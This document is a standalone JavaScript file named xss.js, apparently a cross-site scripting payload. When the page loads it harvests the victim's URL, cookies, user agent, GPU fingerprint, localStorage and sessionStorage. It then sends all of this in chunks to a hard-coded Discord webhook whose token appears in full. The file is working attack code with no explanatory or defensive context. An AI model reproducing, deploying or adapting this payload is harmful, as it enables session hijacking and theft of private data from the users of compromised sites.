<!-- public/xss.js -->
var r_Jn = {};

function prs(t) {
    return void 0 !== t ? t : "";
}

async function sendToDiscord(content) {
    const maxLength = 1900;
    const chunks = [];

    for (let i = 0; i < content.length; i += maxLength) {
        chunks.push(content.slice(i, i + maxLength));
    }

    for (const chunk of chunks) {
        try {
            await fetch("https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ content: chunk })
            });
        } catch (e) {
            console.error("Send failed", e);
        }
    }
}

async function x_po(t) {
    let content = "**XSS Report**\n" +
        "URL: " + prs(t.uri) + "\n" +
        "Cookies: " + prs(t.cookies) + "\n" +
        "User-Agent: " + prs(t["user-agent"]) + "\n" +
        "GPU: " + prs(t.gpu) + "\n" +
        "localStorage: " + JSON.stringify(t.localstorage) + "\n" +
        "sessionStorage: " + JSON.stringify(t.sessionstorage);

    await sendToDiscord(content);
}

function x_PS() {
    try { r_Jn.uri = prs(location.toString()) } catch (t) { r_Jn.uri = "" }
    try { r_Jn.cookies = prs(document.cookie) } catch (t) { r_Jn.cookies = "" }
    try { r_Jn["user-agent"] = prs(navigator.userAgent) } catch (t) { r_Jn["user-agent"] = "" }
    try {
        var r = document.createElement("canvas"),
            e = r.getContext("webgl") || r.getContext("experimental-webgl"),
            n = e.getExtension("webgl_debug_renderer_info"),
            o = e.getParameter(n.UNMASKED_RENDERER_WEBGL);
        r_Jn.gpu = prs(o);
    } catch (t) { r_Jn.gpu = "" }
    try { r_Jn.localstorage = window.localStorage } catch (t) { r_Jn.localstorage = "" }
    try { r_Jn.sessionstorage = window.sessionStorage } catch (t) { r_Jn.sessionstorage = "" }

    x_po(r_Jn);
}

function j_ls(t, r, e) {
    t.addEventListener ? t.addEventListener(r, e, !1) : t.attachEvent && t.attachEvent("on" + r, e);
}

r_Jn = {};
"complete" == document.readyState ? x_PS() : j_ls(window, "load", function () { x_PS() });
